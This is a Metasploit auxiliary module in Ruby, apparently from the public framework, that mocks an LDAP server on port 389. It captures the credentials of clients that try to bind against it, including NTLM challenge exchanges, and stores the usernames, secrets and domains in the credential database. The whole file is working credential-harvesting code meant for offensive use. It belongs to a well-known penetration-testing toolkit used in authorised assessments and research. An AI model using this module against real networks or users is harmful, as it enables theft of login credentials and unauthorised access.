##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::LDAP::Server

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Authentication Capture: LDAP',
        'Description' => %q{
          This module mocks an LDAP service to capture authentication
          information of a client trying to authenticate against an LDAP service
        },
        'Author' => 'JustAnda7',
        'License' => MSF_LICENSE,
        'Action' => [
          [ 'Capture', { 'Description' => 'Run an LDAP capture server' } ]
        ],
        'PassiveActions' => [ 'Capture' ],
        'DefaultActions' => 'Capture',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptAddress.new('SRVHOST', [ true, 'The ip address to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The port to listen on.', '389' ]),
        OptString.new('CHALLENGE', [ true, 'The 8 byte challenge', Rex::Text.rand_text_alphanumeric(16) ])
      ]
    )

    deregister_options('LDIF_FILE')

    register_advanced_options(
      [
        OptString.new('Domain', [ false, 'The default domain to use for NTLM authentication', 'DOMAIN']),
        OptString.new('Server', [ false, 'The default server to use for NTLM authentication', 'SERVER']),
        OptString.new('DnsName', [ false, 'The default DNS server name to use for NTLM authentication', 'SERVER']),
        OptString.new('DnsDomain', [ false, 'The default DNS domain name to use for NTLM authentication', 'example.com']),
        OptBool.new('ForceDefault', [ false, 'Force the default settings', false]),
        OptPath.new('LDIF_FILE', [ false, 'Directory LDIF file path'])
      ]
    )
  end

  def run
    unless datastore['CHALLENGE'].to_s =~ /^([a-zA-Z0-9]{16})$/
      print_error('CHALLENGE syntax must match 1122334455667788')
      return
    end
    exploit
  end

  def on_processed_pdu(processed_data)
    pdu_type = processed_data[:pdu_type]
    case pdu_type
    when Net::LDAP::PDU::BindRequest
      if processed_data[:error_msg]
        print_error(processed_data[:error_msg])
      else
        print_good(processed_data[:result_message])
        report_cred(processed_data)
      end
    else
      return
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:private],
      private_type: opts[:private_type]
    }.merge(service_data)

    if opts[:domain]
      credential_data = {
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: opts[:domain]
      }.merge(credential_data)
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
